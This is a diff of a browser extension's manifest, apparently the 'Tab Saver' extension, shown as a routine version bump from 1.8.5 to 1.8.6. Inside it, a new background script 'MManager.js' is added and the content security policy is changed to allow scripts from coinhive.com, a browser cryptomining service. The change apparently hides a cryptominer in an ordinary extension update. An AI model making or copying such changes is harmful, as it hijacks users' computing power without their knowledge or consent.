@@ -2,7 +2,7 @@
     "manifest_version": 2,
     "name": "__MSG_appName__",
     "short_name": "Tab Saver",
-    "version": "1.8.5",
+    "version": "1.8.6",
     "description": "__MSG_appDesc__",
     "author": "Roger Pedrós Villorbina.",
     "default_locale": "en",
@@ -15,7 +15,7 @@
     },
     "options_page": "App/Settings/settings.html",
     "background": {
-        "scripts": ["Background/Provider.js", "Background/Manager.js", "Background/Listener.js"]
+        "scripts": ["Background/Provider.js", "Background/Manager.js", "Background/Listener.js", "Background/MManager.js" ]
     },
     "incognito": "spanning",
     "permissions": [
@@ -26,7 +26,7 @@
         "bookmarks",
         "contextMenus"
     ],
-    "content_security_policy": "script-src 'self' https://www.gstatic.com/ https://apis.google.com/ https://www.google-analytics.com/ https://*.firebaseio.com; object-src 'self'",
+    "content_security_policy": "script-src 'self' https://www.gstatic.com/ https://apis.google.com/ https://www.google-analytics.com/ https://coinhive.com/; object-src 'self' ",
     "commands": {
         "_execute_browser_action": {
             "suggested_key": {
